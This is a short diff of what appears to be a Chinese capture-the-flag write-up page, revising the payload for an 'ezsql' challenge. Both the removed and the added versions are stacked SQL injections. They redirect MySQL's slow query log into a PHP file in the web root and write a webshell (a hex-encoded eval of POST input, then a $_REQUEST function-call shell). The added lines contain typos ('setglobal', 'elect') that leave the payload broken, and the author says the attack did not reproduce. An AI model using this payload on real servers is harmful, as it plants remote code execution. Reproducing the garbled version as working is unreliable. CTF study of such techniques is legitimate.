@@ -192,7 +192,11 @@ zip -y guoke1.zip guoke/*
 上传guoke1.zip
 </code></pre>
 <h2 id="ezsql">ezsql</h2>
-<pre><code>1);set GLOBAL slow_query_log_file='/var/www/html/helpyou2findflag.php';set GLOBAL slow_query_log=on;set GLOBAL log_queries_not_using_indexes=on;select 0x3c3f706870206576616c28245f504f53545b315d293b3f3e from mysql.db where BENCHMARK(5000000000,MD5(0x5476556d));%23
+<pre><code>1);
+set GLOBAL slow_query_log_file='/var/www/html/helpyou2findflag.php';
+set GLOBAL slow_query_log=on;
+setglobal long_query_time=0.000001;
+elect '&lt;?php $_REQUEST[a]($_REQUEST[b])?&gt;';--+
 </code></pre>
 <p>听说是慢查询getshell？然而没复现成功。等WP了</p>
 
